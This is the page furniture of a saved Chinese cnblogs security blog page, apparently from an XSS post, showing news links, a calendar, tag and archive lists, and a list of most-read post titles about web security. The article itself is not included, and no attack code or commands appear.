+    <b>最新 IT 新闻</b>:
+    <br>
+ ·              <a href="https://news.cnblogs.com/n/657363/" target="_blank">百度输入法日均语音请求超10亿次</a>
+            <br>
+ ·              <a href="https://news.cnblogs.com/n/657362/" target="_blank">HomeKit将获三项重要新功能：引入面部识别</a>
+            <br>
+ ·              <a href="https://news.cnblogs.com/n/657361/" target="_blank">微软宣布成功破坏已感染了全球900万台PC的Necurs僵尸网络</a>
+            <br>
+ ·              <a href="https://news.cnblogs.com/n/657357/" target="_blank">基因编辑里程碑！首个 CRISPR 疗法患者体内给药完成</a>
+            <br>
+ ·              <a href="https://news.cnblogs.com/n/657360/" target="_blank">微博、Facebook均中招！美国AI公司伪造APP获取用户隐私数据</a>
+            <br>
+    » <a href="https://news.cnblogs.com/" title="IT 新闻" target="_blank">更多新闻...</a>
+</div></div>
+    <div id="HistoryToday" class="c_ad_block"></div>
+    <script type="text/javascript">
+        fixPostBody();
+setTimeout(function() { incrementViewCount(cb_entryId); }, 50);        deliverAdT2();
+        deliverAdC1();
+        deliverAdC2();
+        loadNewsAndKb();
+        loadBlogSignature();
+LoadPostCategoriesTags(cb_blogId, cb_entryId);        LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+        GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+        loadOptUnderPost();
+        GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    </script>
+</div>
+
+</div>
+</div>
+<div id="leftmenu">
+
+
+<h3>导航</h3>
+<ul>
+    <li>
+        <a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+
+    </li>
+    <li>
+        
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/moonnight/">
+首页</a>
+
+    </li>
+    <li>
+        
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+
+    </li>
+    <li>
+        
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/%E6%9C%88%E5%B0%BD%E8%A5%BF%E6%A5%BC">
+联系</a>
+    </li>
+    <li>
+        
+<a id="blog_nav_rss" class="menu" href="https://www.cnblogs.com/moonnight/rss/">
+订阅</a>
+        
+<a id="blog_nav_rss_image" href="https://www.cnblogs.com/moonnight/rss/">
+    <img src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/xml.gif" alt="订阅">
+</a>
+    </li>
+    <li>
+        
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+
+    </li>
+</ul>
+
+
+<div id="blog-calendar" style="">
+
+<table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar" border="0">
+    <tbody>
+        <tr>
+            <td colspan="7">
+                <table class="CalTitle" cellspacing="0" border="0">
+                    <tbody>
+                        <tr>
+                            <td class="CalNextPrev">
+                                <a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2020/02/11&#39;); return false;">&lt;</a>
+                            </td>
+                            <td align="center">2020年3月</td>
+                            <td align="right" class="CalNextPrev">
+                                <a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2020/04/11&#39;); return false;">&gt;</a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+        <tr>
+                    <th class="CalDayHeader" align="center" abbr="日" scope="col">日</th>
+                    <th class="CalDayHeader" align="center" abbr="一" scope="col">一</th>
+                    <th class="CalDayHeader" align="center" abbr="二" scope="col">二</th>
+                    <th class="CalDayHeader" align="center" abbr="三" scope="col">三</th>
+                    <th class="CalDayHeader" align="center" abbr="四" scope="col">四</th>
+                    <th class="CalDayHeader" align="center" abbr="五" scope="col">五</th>
+                    <th class="CalDayHeader" align="center" abbr="六" scope="col">六</th>
+        </tr>
+            <tr>
+                        <td class="CalWeekendDay" align="center">
+                            1
+                        </td>
+                        <td class="" align="center">
+                            2
+                        </td>
+                        <td class="" align="center">
+                            3
+                        </td>
+                        <td class="" align="center">
+                            4
+                        </td>
+                        <td class="" align="center">
+                            5
+                        </td>
+                        <td class="" align="center">
+                            6
+                        </td>
+                    <td class="CalWeekendDay" align="center">
+                        7
+                    </td>
+            </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            8
+                        </td>
+                            <td class="" align="center">
+                                9
+                            </td>
+                            <td class="" align="center">
+                                10
+                            </td>
+                            <td class="CalTodayDay" align="center">
+                                11
+                            </td>
+                            <td class="" align="center">
+                                12
+                            </td>
+                            <td class="" align="center">
+                                13
+                            </td>
+                        <td class="CalWeekendDay" align="center">
+                            14
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            15
+                        </td>
+                            <td class="" align="center">
+                                16
+                            </td>
+                            <td class="" align="center">
+                                17
+                            </td>
+                            <td class="" align="center">
+                                18
+                            </td>
+                            <td class="" align="center">
+                                19
+                            </td>
+                            <td class="" align="center">
+                                20
+                            </td>
+                        <td class="CalWeekendDay" align="center">
+                            21
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            22
+                        </td>
+                            <td class="" align="center">
+                                23
+                            </td>
+                            <td class="" align="center">
+                                24
+                            </td>
+                            <td class="" align="center">
+                                25
+                            </td>
+                            <td class="" align="center">
+                                26
+                            </td>
+                            <td class="" align="center">
+                                27
+                            </td>
+                        <td class="CalWeekendDay" align="center">
+                            28
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            29
+                        </td>
+                            <td class="" align="center">
+                                30
+                            </td>
+                            <td class="" align="center">
+                                31
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                1
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                2
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                3
+                            </td>
+                        <td class="CalOtherMonthDay" align="center">
+                            4
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalOtherMonthDay" align="center">
+                            5
+                        </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                6
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                7
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                8
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                9
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                10
+                            </td>
+                        <td class="CalOtherMonthDay" align="center">
+                            11
+                        </td>
+                </tr>
+    </tbody>
+</table></div><script>loadBlogDefaultCalendar();</script>
+
+<div id="sidebar_news" class="newsItem"><meta name="vs_showGrid" content="False">
+<h3>公告</h3>
+
+<div id="blog-news">
+    
+    <div id="profile_block">
+        昵称：
+        <a href="https://home.cnblogs.com/u/moonnight/">
+            月尽西楼
+        </a>
+        <br>
+        园龄：
+        <a href="https://home.cnblogs.com/u/moonnight/" title="入园时间：2015-08-11">
+            4年7个月
+        </a>
+        <br>
+        粉丝：
+        <a href="https://home.cnblogs.com/u/moonnight/followers/">
+            6
+        </a>
+        <br>
+        关注：
+        <a href="https://home.cnblogs.com/u/moonnight/followees/">
+            5
+        </a>
+        <div id="p_b_follow">
+<a href="javascript:void(0)" onclick="follow(&#39;afc76929-d13f-e511-b908-9dcfd8948a71&#39;)">+加关注</a></div>
+        <script>getFollowStatus('afc76929-d13f-e511-b908-9dcfd8948a71');</script>
+    </div>
+</div>
+
+</div>
+
+<div id="blog-sidecolumn">
+<!-- 搜索 -->
+<div id="sidebar_search" class="sidebar-block">
+    <div id="sidebar_search" class="mySearch">
+        <h3 class="catListTitle">搜索</h3>
+        <div id="sidebar_search_box">
+            <div id="widget_my_zzk" class="div_my_zzk">
+                <input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk">
+            </div>
+            <div id="widget_my_google" class="div_my_zzk">
+                <input type="text" name="google_q" id="google_q" onkeydown="return google_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="google_go()" type="button" value="谷歌搜索" class="btn_my_zzk">
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 常用链接 -->
+<div id="sidebar_shortcut" class="sidebar-block">
+    
+<h3 class="catListTitle">
+常用链接
+</h3>
+<ul>
+        <li>
+
+<a href="https://www.cnblogs.com/moonnight/p/" title="我的博客的随笔列表">我的随笔</a>
+</li>
+        <li>
+
+<a href="https://www.cnblogs.com/moonnight/MyComments.html" title="我的发表过的评论列表">我的评论</a>
+</li>
+        <li>
+
+<a href="https://www.cnblogs.com/moonnight/OtherPosts.html" title="我评论过的随笔列表">我的参与</a>
+</li>
+        <li>
+
+<a href="https://www.cnblogs.com/moonnight/RecentComments.html" title="我的博客的评论列表">最新评论</a>
+</li>
+        <li>
+
+<a href="https://www.cnblogs.com/moonnight/tag/" title="我的博客的标签列表">我的标签</a>
+</li>
+</ul>
+
+<!-- TODO: 检查是否有使用这一部分的控件，如果没有则应该删除。 -->
+<div id="itemListLin_con" style="display:none">
+    <ul>
+
+    </ul>
+</div>
+
+</div>
+
+<!-- 最新随笔 -->
+
+
+
+<!-- 我的标签 -->
+<div id="sidebar_toptags" class="sidebar-block">
+    
+<h3>我的标签</h3>
+<div id="MyTag">
+    <ul>
+        
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/python/">python</a>(6)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>(4)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/xss/">xss</a>(2)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a>(2)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/cms%E6%BC%8F%E6%B4%9E/">cms漏洞</a>(2)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/mysql/">mysql</a>(2)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/PHP/">PHP</a>(2)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/pwn/">pwn</a>(1)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/OD/">OD</a>(1)
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/moonnight/tag/HTTP%E5%9F%BA%E7%A1%80/">HTTP基础</a>(1)
+        </li>
+            <li>
+                <a href="https://www.cnblogs.com/moonnight/tag/">更多</a>
+            </li>
+
+    </ul>
+</div>
+
+</div>
+
+<!-- 积分与排名 -->
+
+
+<!-- 随笔分类、随笔档案、文章分类、新闻分类、相册、链接 -->
+<div id="sidebar_categories">
+    
+		<h3>
+
+随笔档案
+
+
+</h3>
+				<ul>
+			
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2018/01.html" rel="" target="">
+    2018年1月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2017/04.html" rel="" target="">
+    2017年4月(2)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2017/03.html" rel="" target="">
+    2017年3月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2017/01.html" rel="" target="">
+    2017年1月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/11.html" rel="" target="">
+    2016年11月(2)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/10.html" rel="" target="">
+    2016年10月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/09.html" rel="" target="">
+    2016年9月(2)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/08.html" rel="" target="">
+    2016年8月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/06.html" rel="" target="">
+    2016年6月(2)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/04.html" rel="" target="">
+    2016年4月(3)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/03.html" rel="" target="">
+    2016年3月(2)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2016/02.html" rel="" target="">
+    2016年2月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2015/11.html" rel="" target="">
+    2015年11月(1)
+</a>
+
+</li>
+				<li>
+<a href="https://www.cnblogs.com/moonnight/archive/2015/10.html" rel="" target="">
+    2015年10月(1)
+</a>
+
+</li>
+			
+				</ul>
+
+
+</div>
+
+<!-- 最新评论 -->
+<div id="sidebar_recentcomments" class="sidebar-block">
+    
+</div>
+
+
+
+<!-- 阅读排行榜 -->
+<div id="sidebar_topviewedposts" class="sidebar-block">
+    
+<div id="topview_posts_wrap">
+    <h3 class="catListTitle">阅读排行榜</h3>
+    <div id="TopViewPostsBlock">
+        <ul style="word-break:break-all">
+                    <li>
+                        <a href="https://www.cnblogs.com/moonnight/p/5989780.html">
+                            1. 从零开始写网站登录爆破（一）(9210)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/moonnight/p/6572599.html">
+                            2. dedecms5.6漏洞尝试(3110)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/moonnight/p/6033416.html">
+                            3. Joomla未授权创建特权用户漏洞和getshell脚本解析(2378)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/moonnight/p/5600513.html">
+                            4. Kali Rolling 物理机安装实践(1965)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/moonnight/p/5873630.html">
+                            5. CSRF学习整理(1502)
+                        </a>
+                    </li>
+        </ul>
+    </div>
+</div>
+</div>
+
+<!-- 评论排行榜 -->
+<div id="sidebar_topcommentedposts" class="sidebar-block">
+    
+</div>
+
+<!-- 推荐排行榜 -->
+<div id="sidebar_topdiggedposts" class="sidebar-block">
+    
+</div></div>
+                    <script>loadBlogSideColumn();</script>
+
+</div>
+</div>
+<div class="clear"></div>
+<div id="footer">
+<p id="footer">
+	Powered by: 
+	<br>
+	
+	
+<a href="https://www.cnblogs.com/" id="Footer1_Hyperlink3" style="font-size: 12px; font-family: Verdana">博客园</a>
+	<br>
+	Copyright © 2020 月尽西楼
+<br><span id="poweredby">Powered by .NET Core on Kubernetes</span>
+
+</p>
+
+
+</div>
+</div>
+
+
+    
+
+</body></html>
